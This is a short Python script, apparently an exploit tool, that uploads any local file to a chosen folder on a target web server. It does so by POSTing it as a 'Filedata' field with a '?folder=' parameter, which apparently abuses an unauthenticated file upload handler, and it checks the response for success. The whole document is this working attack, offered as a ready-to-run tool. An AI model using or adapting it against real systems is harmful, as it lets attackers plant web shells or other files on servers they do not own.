#!/usr/bin/python

import requests, sys, time

#author: wanetty


if len(sys.argv) == 4:
    local_file = sys.argv[1]
    remote_path = sys.argv[2]
    url = sys.argv[3]
else:
    print (f"Usage: {sys.argv[0]} File2Upload RemotePath TargetUrl")
    exit(1)
print(f"\nFile to upload: {local_file}")
print(f"Remote path to upload: {remote_path}")
print(f"Target Url: {url}\n")

print("Sending request...")
time.sleep(3)
files = {'Filedata': open(local_file,'rb')}
allurl = url + "?folder="+ remote_path
r = requests.post(allurl,files=files)
print(f'Output:  {r.text}')
if str(local_file) in r.text:
    print("File has been uploaded")
else:
    print("Something has gone wrong...")
    exit(1)

    

